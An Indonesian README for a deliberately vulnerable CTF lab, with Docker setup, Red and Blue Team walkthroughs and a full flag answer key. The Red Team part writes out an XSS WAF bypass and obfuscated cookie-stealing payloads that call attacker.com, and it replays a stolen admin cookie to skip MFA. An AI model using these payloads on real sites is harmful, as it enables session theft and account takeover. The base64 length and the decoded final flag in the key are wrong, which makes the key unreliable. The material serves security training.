# CTF Lab - Admin Feedback System

> **Apa ini?**
> Ini adalah lab CTF (Capture The Flag) — sebuah website yang **sengaja dibuat rentan/bisa di-hack** untuk latihan keamanan siber.
> Ada 2 jalur permainan:
> - 🔴 **Red Team** = Menyerang website (jadi hacker)
> - 🔵 **Blue Team** = Investigasi log serangan (jadi detektif)

---

## Daftar Isi

1. [Konsep Dasar (Untuk Yang Belum Paham)](#konsep-dasar)
2. [Arsitektur Sistem](#arsitektur-sistem)
3. [Cara Deploy (Setup di Server)](#cara-deploy)
4. [Red Team Walkthrough (Jalur Menyerang)](#-red-team-walkthrough-jalur-menyerang)
5. [Blue Team Walkthrough (Jalur Investigasi)](#-blue-team-walkthrough-jalur-investigasi)
6. [Daftar Semua Flag](#daftar-semua-flag)
7. [Struktur File & Penjelasan](#struktur-file--penjelasan)
8. [Troubleshooting](#troubleshooting)
9. [Checklist Deliverable](#checklist-deliverable)

---

## Konsep Dasar

### Apa itu CTF?
CTF (Capture The Flag) = Kompetisi keamanan siber dimana peserta harus menemukan "flag" (kode rahasia) yang tersembunyi di sebuah sistem.

### Bagaimana lab ini bekerja?

```
ATTACKER (Red Team)                     DEFENDER (Blue Team)
       │                                        │
       ▼                                        ▼
Serang website ──────────────────► Jejak terekam di LOG
       │                                        │
       ▼                                        ▼
Temukan flag di website             Temukan flag dari analisis log
```

**Analoginya:**
- Website ini = Toko yang sengaja pintunya lemah
- Red Team = Maling yang coba masuk
- Blue Team = Satpam yang baca CCTV setelah kejadian
- Flag = Stempel bukti di setiap checkpoint

### Format flag:
```
SCENARIO75{jawaban}
```
Contoh: `SCENARIO75{Node.js}`, `SCENARIO75{/dashboard}`

---

## Arsitektur Sistem

```
┌──────────────────────────────────────────────────────────────┐
│                    SERVER (Linux VM)                          │
│                                                              │
│   ┌─────────────────┐                                       │
│   │   Nginx         │ ← Pintu masuk, terima traffic         │
│   │   Port 3075     │   dari internet                       │
│   └────────┬────────┘                                       │
│            │                                                 │
│            ▼                                                 │
│   ┌─────────────────┐     ┌─────────────────┐               │
│   │   Node.js App   │     │   SSH Server    │               │
│   │   Port 3000     │     │   Port 2275     │               │
│   │   (website)     │     │   (Blue Team)   │               │
│   └────────┬────────┘     └─────────────────┘               │
│            │                                                 │
│            ▼                                                 │
│   ┌─────────────────┐                                       │
│   │   /opt/admin/   │                                       │
│   │   logs/         │ ← Rekaman semua aktivitas             │
│   │   - access.log  │                                       │
│   │   - error.log   │                                       │
│   └─────────────────┘                                       │
└──────────────────────────────────────────────────────────────┘
```

**4 Container Docker yang jalan:**
| Container | Fungsi |
|-----------|--------|
| `ctf-nginx` | Pintu depan website (port 3075) |
| `ctf-feedback-app` | Aplikasi web Node.js |
| `ctf-ssh` | SSH server untuk Blue Team (port 2275) |
| `ctf-log-injector` | Inject log palsu saat pertama deploy |

---

## Cara Deploy

### Yang Dibutuhkan
- ✅ Server Linux (Ubuntu/Debian) — VPS, VM Proxmox, atau dedicated
- ✅ Docker & Docker Compose terinstall di server
- ✅ Akses SSH ke server

### Langkah-Langkah (Copy-Paste Aja)

```bash
# 1. SSH ke server kamu
ssh user@IP_SERVER

# 2. Clone project dari GitHub
git clone <url-repo> ~/ctf-lab
cd ~/ctf-lab

# 3. Jalankan semua container (build + start)
docker-compose up -d --build

# 4. Inject log simulasi serangan
# (Cek nama volume dulu)
docker volume ls | grep logs
# Lalu jalankan (ganti nama volume sesuai output di atas):
docker run --rm -v NAMA_VOLUME:/opt/admin/logs -v ~/ctf-lab/scripts:/scripts alpine sh /scripts/generate-logs.sh
```

### Verifikasi Berhasil

```bash
# Cek semua container aktif (harus ada 3: app, nginx, ssh)
docker-compose ps

# Test website
curl -I http://localhost:3075
# Harus muncul: HTTP/1.1 200 OK + X-Powered-By: Node.js

# Test SSH Blue Team
ssh -p 2275 analyst@localhost
# Password: blue_team_rocks
# Lalu cek: cat /opt/admin/logs/access.log | grep "10.10.14.50"
```

### Akses Dari Luar

| Service | URL/Command |
|---------|------------|
| 🌐 Website | `http://IP_SERVER:3075` |
| 🔑 SSH Blue Team | `ssh -p 2275 analyst@IP_SERVER` (pass: `blue_team_rocks`) |

---

## 🔴 Red Team Walkthrough (Jalur Menyerang)

> **Cerita:** Kamu adalah hacker. Target kamu adalah website "Admin Feedback System".
> Tujuan: Masuk ke halaman admin (/dashboard) tanpa punya password.

---

### FASE 1: Reconnaissance (Kumpulkan Informasi)

Sebelum nyerang, kumpulkan info dulu tentang target.

---

#### Langkah 1: Cek teknologi backend

**Apa yang dilakukan:** Kirim request ke website, lihat header response-nya.

```bash
curl -I http://IP_SERVER:3075
```

**Yang dicari:** Baris `X-Powered-By`

**Hasil:** `X-Powered-By: Node.js` → Website pakai Node.js

> 🚩 **Flag: `SCENARIO75{Node.js}`**

---

#### Langkah 2: Buka robots.txt

**Apa yang dilakukan:** File `robots.txt` biasanya berisi daftar halaman yang "disembunyikan" dari search engine. Ironisnya, ini jadi petunjuk buat hacker.

Buka di browser: `http://IP_SERVER:3075/robots.txt`

**Hasil:**
```
Disallow: /api/verify-mfa
Disallow: /dashboard
```

**Artinya:** Ada endpoint MFA verification dan halaman admin dashboard!

> 🚩 **Flag: `SCENARIO75{/api/verify-mfa}`**
> 🚩 **Flag: `SCENARIO75{/dashboard}`**

---

#### Langkah 3: Lihat source code HTML

**Apa yang dilakukan:** Klik kanan di browser → "View Page Source"

**Yang dicari:** Ada komentar HTML tersembunyi berisi ASCII art:
```html
<!--
    ║   >> Hint: Have you checked robots.txt? <<               ║
-->
```

> 🚩 **Flag: `SCENARIO75{robots.txt}`**

---

#### Langkah 4: Perhatikan cookie yang dikasih website

**Apa yang dilakukan:** Website otomatis kasih cookie (kartu identitas sementara) saat pertama kali diakses.

```bash
curl -v http://IP_SERVER:3075 2>&1 | grep Set-Cookie
```

**Hasil:** `Set-Cookie: pre_mfa_session=pending_mfa_verification; Path=/`

**Artinya:** Cookie bernama `pre_mfa_session` dengan nilai `pending_mfa_verification`

> 🚩 **Flag: `SCENARIO75{pre_mfa_session}`**
> 🚩 **Flag: `SCENARIO75{pending_mfa_verification}`**

---

### FASE 2: WAF Bypass + XSS (Tembus Firewall)

Website punya "satpam" bernama WAF (Web Application Firewall). Kita harus cari cara bypass.

---

#### Langkah 5: Form pakai method apa?

**Jawaban:** Form feedback mengirim data lewat **POST** method.

> 🚩 **Flag: `SCENARIO75{POST}`**

---

#### Langkah 6: Coba serangan standar (akan diblock)

**Apa yang dilakukan:** Kirim payload `<script>` lewat form feedback.

```bash
curl -X POST http://IP_SERVER:3075/api/feedback \
  -H "Content-Type: application/json" \
  -d '{"feedback":"<script>alert(1)</script>"}'
```

**Hasil:** Status **403 Forbidden** — WAF mendeteksi dan memblokir!

> 🚩 **Flag: `SCENARIO75{403}`**

---

#### Langkah 7: Bypass WAF pakai `<svg>`

**Apa yang dilakukan:** WAF cuma kenal `<script>`. Pakai tag HTML5 lain yang juga bisa jalankan JavaScript.

```bash
curl -X POST http://IP_SERVER:3075/api/feedback \
  -H "Content-Type: application/json" \
  -d '{"feedback":"<svg onload=alert(1)>"}'
```

**Hasil:** Status **200 OK** — WAF tidak mendeteksi! Serangan lolos!

**Kenapa bisa lolos:** WAF hanya mengecek `<script>`, tidak mengecek `<svg>`, `<img>`, dll.

> 🚩 **Flag: `SCENARIO75{<svg>}`**

---

#### Langkah 8: Obfuscation (Samarin kode jahat)

**Masalah:** WAF juga block kata `document.cookie` (cara baca cookie di JavaScript).

**Solusi:** Pecah kata-katanya pakai bracket notation:
```javascript
window['docu'+'ment']['coo'+'kie']
```

WAF baca ini sebagai teks biasa, tapi browser tetap menjalankannya sebagai `document.cookie`.

> 🚩 **Flag: `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`**

---

#### Langkah 9: Cookie bisa dicuri

**Kenapa:** Cookie `pre_mfa_session` diset dengan `HttpOnly = false`. Artinya JavaScript di browser bisa membaca cookie ini.

Kalau `HttpOnly = true` → JavaScript tidak bisa baca cookie → aman.
Kalau `HttpOnly = false` → JavaScript bisa baca → bisa dicuri!

> 🚩 **Flag: `SCENARIO75{False}`**

---

#### Langkah 10: Kirim cookie curian ke server attacker

**Cara:** Attacker pakai `fetch()` API untuk mengirim cookie ke server miliknya.

Payload lengkapnya (yang dikirim lewat `<svg>`):
```html
<svg onload=fetch('http://attacker.com/steal?c='+window['docu'+'ment']['coo'+'kie'])>
```

> 🚩 **Flag: `SCENARIO75{fetch}`**

---

### FASE 3: MFA Bypass (Masuk Tanpa Verifikasi)

Sekarang attacker punya cookie admin yang dicuri. Tinggal pakai.

---

#### Langkah 11: Replay cookie curian ke dashboard

**Apa yang dilakukan:** Akses halaman admin sambil kirim cookie admin.

```bash
curl http://IP_SERVER:3075/dashboard \
  -H "Cookie: adm_sess=adm_sess_7f3c2d1a9b4e8f6c"
```

**Hasil:** Server kasih akses! Tidak ada pengecekan MFA!

**Kenapa bisa:** Server cuma cek "apakah cookie valid?" tanpa cek "apakah user ini sudah lewat MFA?"

> 🚩 **Flag: `SCENARIO75{/api/verify-mfa}`** (endpoint yang di-skip)

---

#### Langkah 12: Prefix cookie admin

Cookie admin dimulai dengan prefix `adm_sess`.

> 🚩 **Flag: `SCENARIO75{adm_sess}`**

---

#### Langkah 13: XSS payload terlihat di dashboard

Payload `<svg>` yang dikirim di langkah 7 muncul di dashboard dalam element:
```html
<div class="xss-payload">..payload disini..</div>
```

> 🚩 **Flag: `SCENARIO75{xss-payload}`**

---

#### Langkah 14: FLAG FINAL RED TEAM 🏁

Di halaman dashboard, tertulis jelas:

```
SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```

> 🏆 **Red Team selesai! Kamu berhasil masuk admin tanpa password!**

---

## 🔵 Blue Team Walkthrough (Jalur Investigasi)

> **Cerita:** Kamu adalah security analyst. Ada insiden keamanan. Tugasmu: baca log, cari tahu siapa yang menyerang, kapan, dan bagaimana.

**Cara masuk:**
```bash
ssh -p 2275 analyst@IP_SERVER
# Password: blue_team_rocks
```

---

### FASE 1: Log Forensics (Baca Rekaman Kejadian)

---

#### Langkah 1: Temukan lokasi log

```bash
ls /opt/admin/logs/
```

**Hasil:** `access.log` dan `error.log`

> 🚩 **Flag: `SCENARIO75{/opt/admin/logs}`**

---

#### Langkah 2: Identifikasi IP penyerang

```bash
cat /opt/admin/logs/access.log
```

**Cara identifikasi:**
- `192.168.1.100` → IP internal, admin sah (traffic normal)
- `10.10.14.50` → IP asing, BUKAN dari jaringan internal → **ini attackernya!**

User-Agent attacker: `Mozilla/5.0`

> 🚩 **Flag: `SCENARIO75{10.10.14.50}`**
> 🚩 **Flag: `SCENARIO75{Mozilla/5.0}`**

---

#### Langkah 3: Kapan attacker berhasil masuk dashboard?

```bash
grep "10.10.14.50.*dashboard.*200" /opt/admin/logs/access.log
```

**Hasil:** Ada entry dengan status **200** (berhasil) pada jam **18:51:55**

> 🚩 **Flag: `SCENARIO75{200}`**
> 🚩 **Flag: `SCENARIO75{18:51:55}`**

---

#### Langkah 4: Temukan bukti data curian

Di baris log dashboard 200, ada string aneh di kolom X-Forwarded-For:
```
UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0
```

Ini adalah data ter-encode yang dikirim attacker keluar.

> 🚩 **Flag: `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}`**

---

### FASE 2: Threat Hunting (Cari Pola Serangan)

---

#### Langkah 5: Identifikasi traffic normal (baseline)

```bash
grep "192.168.1.100" /opt/admin/logs/access.log
```

IP `192.168.1.100` = admin yang sah, melakukan aktivitas normal.

> 🚩 **Flag: `SCENARIO75{192.168.1.100}`**

---

#### Langkah 6: Subnet attacker

IP `10.10.14.50` berada di subnet `10.10.14.0/24`
(Semua IP dari 10.10.14.1 sampai 10.10.14.254)

> 🚩 **Flag: `SCENARIO75{10.10.14.0/24}`**

---

#### Langkah 7: Cek alert firewall (WAF)

```bash
grep "WAF BLOCK" /opt/admin/logs/error.log
```

**Hasil:** Block pertama tercatat di `error.log` pada jam **18:50:15** untuk payload `<script>`.

> 🚩 **Flag: `SCENARIO75{/opt/admin/logs/error.log}`**
> 🚩 **Flag: `SCENARIO75{<script>}`**
> 🚩 **Flag: `SCENARIO75{18:50:15}`**

---

#### Langkah 8: Apakah attacker pernah lewat MFA?

```bash
grep "10.10.14.50.*verify-mfa" /opt/admin/logs/access.log
```

**Hasil:** Kosong! Attacker **tidak pernah** mengakses endpoint MFA → dia bypass!

> 🚩 **Flag: `SCENARIO75{No}`**

---

### FASE 3: Incident Response (Analisis Mendalam)

---

#### Langkah 9: Analisis string ter-encode

String: `UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0`

**Tanda-tanda Base64:**
- Hanya terdiri dari huruf besar, kecil, angka, dan +/=
- Panjangnya: **44 karakter**

```bash
echo -n "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | wc -c
```

> 🚩 **Flag: `SCENARIO75{Base64}`**
> 🚩 **Flag: `SCENARIO75{44}`**

---

#### Langkah 10: Cek severity level

```bash
grep "CRITICAL" /opt/admin/logs/error.log
```

Event "cookie reuse" (cookie dipakai ulang dari IP berbeda) ditandai level **CRITICAL**.

> 🚩 **Flag: `SCENARIO75{CRITICAL}`**

---

#### Langkah 11: Cari anomaly spesifik

```bash
grep "18:53:10" /opt/admin/logs/error.log
```

**Hasil:** `[CRITICAL] Authentication bypass anomaly: admin session accessed without /api/verify-mfa completion`

> 🚩 **Flag: `SCENARIO75{18:53:10}`**
> 🚩 **Flag: `SCENARIO75{Authentication bypass anomaly}`**

---

#### Langkah 12: FLAG FINAL BLUE TEAM 🏁

Decode string Base64 dari langkah 4:
```bash
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
```

> 🏆 **Flag: `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`**

---

## Daftar Semua Flag

### Red Team (14 flag)
| # | Flag | Ditemukan di |
|---|------|-------------|
| 1 | `SCENARIO75{Node.js}` | Header HTTP |
| 2 | `SCENARIO75{/api/verify-mfa}` | robots.txt |
| 3 | `SCENARIO75{/dashboard}` | robots.txt |
| 4 | `SCENARIO75{robots.txt}` | HTML source code |
| 5 | `SCENARIO75{pre_mfa_session}` | Cookie name |
| 6 | `SCENARIO75{pending_mfa_verification}` | Cookie value |
| 7 | `SCENARIO75{POST}` | Form method |
| 8 | `SCENARIO75{403}` | WAF block status |
| 9 | `SCENARIO75{<svg>}` | WAF bypass tag |
| 10 | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` | Obfuscation |
| 11 | `SCENARIO75{False}` | HttpOnly setting |
| 12 | `SCENARIO75{fetch}` | Exfiltration API |
| 13 | `SCENARIO75{adm_sess}` | Session prefix |
| 14 | `SCENARIO75{xss-payload}` | CSS class name |
| 🏁 | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` | Dashboard |

### Blue Team (18 flag)
| # | Flag | Ditemukan di |
|---|------|-------------|
| 1 | `SCENARIO75{/opt/admin/logs}` | Log location |
| 2 | `SCENARIO75{10.10.14.50}` | Attacker IP |
| 3 | `SCENARIO75{Mozilla/5.0}` | User-Agent |
| 4 | `SCENARIO75{200}` | Dashboard status code |
| 5 | `SCENARIO75{18:51:55}` | Dashboard access time |
| 6 | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}` | Base64 string |
| 7 | `SCENARIO75{192.168.1.100}` | Legitimate admin IP |
| 8 | `SCENARIO75{10.10.14.0/24}` | Attacker subnet |
| 9 | `SCENARIO75{/opt/admin/logs/error.log}` | WAF alert file |
| 10 | `SCENARIO75{<script>}` | First blocked payload |
| 11 | `SCENARIO75{18:50:15}` | First WAF block time |
| 12 | `SCENARIO75{No}` | Attacker MFA access |
| 13 | `SCENARIO75{Base64}` | Encoding type |
| 14 | `SCENARIO75{44}` | Encoded string length |
| 15 | `SCENARIO75{CRITICAL}` | Severity level |
| 16 | `SCENARIO75{18:53:10}` | Anomaly timestamp |
| 17 | `SCENARIO75{Authentication bypass anomaly}` | Warning message |
| 🏁 | `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` | Decoded Base64 |

---

## Struktur File & Penjelasan

```
ctf-lab/
│
├── docker-compose.yml          ← "Remote control" semua container
│                                  (1 command = 4 container nyala)
│
├── README.md                   ← File dokumentasi ini
├── .gitignore                  ← Daftar file yang gak perlu di-upload ke Git
│
├── app/                        ← FOLDER APLIKASI WEBSITE
│   ├── Dockerfile              ← Resep bikin container aplikasi
│   ├── .dockerignore           ← File yang gak perlu masuk container
│   ├── package.json            ← Daftar library Node.js yang dipakai
│   ├── server.js               ← FILE UTAMA — semua logic website di sini
│   │                              (route, cookie, MFA bypass logic)
│   ├── middleware/
│   │   └── waf.js              ← "Satpam bodoh" (firewall yang bisa di-bypass)
│   ├── public/
│   │   ├── robots.txt          ← File yang bocorkan path rahasia
│   │   └── css/
│   │       └── style.css       ← Styling halaman
│   └── views/
│       ├── index.ejs           ← Halaman utama (form feedback)
│       ├── dashboard.ejs       ← Halaman admin (target akhir attacker)
│       └── unauthorized.ejs    ← Halaman "akses ditolak" (401)
│
├── nginx/                      ← FOLDER KONFIGURASI NGINX
│   └── nginx.conf              ← Setting reverse proxy + format log
│
├── ssh/                        ← FOLDER CONTAINER SSH (Blue Team access)
│   └── Dockerfile              ← Bikin container SSH dengan user analyst
│
├── logs/                       ← FOLDER LOG (di-mount dari Docker volume)
│
└── scripts/                    ← FOLDER SCRIPT OTOMASI
    ├── generate-logs.sh        ← Bikin log serangan palsu (untuk Blue Team)
    └── setup-proxmox.sh        ← Script setup server otomatis
```

---

## Troubleshooting

| Masalah | Penyebab | Solusi |
|---------|----------|--------|
| Port already in use | Service lain pakai port 3075/2275 | Matikan service lain: `sudo lsof -i :3075` lalu kill |
| Log kosong / cuma traffic real | Script inject belum jalan | Jalankan: `docker run --rm -v NAMA_VOLUME:/opt/admin/logs -v ~/ctf-lab/scripts:/scripts alpine sh /scripts/generate-logs.sh` |
| Container gagal build | Biasanya network issue | Cek: `docker-compose logs nama-container` |
| SSH connection refused | Container SSH belum jalan | `docker-compose ps` → pastikan ctf-ssh status Up |
| Permission denied baca log | Volume permission issue | `docker exec ctf-feedback-app chmod 644 /opt/admin/logs/*.log` |

---

## Cara Matikan Lab

```bash
cd ~/ctf-lab
docker-compose down -v    # Matikan semua container + hapus volume log
```

---

## Checklist Deliverable

### Yang Diminta Soal vs Yang Sudah Dikerjakan:

| # | Requirement | File/Lokasi | Status |
|---|-------------|-------------|--------|
| 1 | Source code Node.js | `app/server.js`, `app/middleware/waf.js` | ✅ Done |
| 2 | Docker / Docker Compose | `docker-compose.yml`, `app/Dockerfile`, `ssh/Dockerfile` | ✅ Done |
| 3 | Script setup Proxmox VM | `scripts/setup-proxmox.sh` | ✅ Done |
| 4 | Script create SSH user | Embedded in `ssh/Dockerfile` + `setup-proxmox.sh` | ✅ Done |
| 5 | Script inject mock logs | `scripts/generate-logs.sh` | ✅ Done |
| 6 | Web app di port 3075 | `docker-compose.yml` (nginx → 3075:80) | ✅ Tested |
| 7 | SSH port 2275 (analyst/blue_team_rocks) | `docker-compose.yml` + `ssh/Dockerfile` | ✅ Tested |
| 8 | README + deployment instructions | File ini | ✅ Done |
| 9 | Red Team walkthrough | Bagian README di atas | ✅ Done |
| 10 | Blue Team walkthrough | Bagian README di atas | ✅ Done |
| 11 | Push ke GitHub/GitLab | Repository | ✅ Done |


---




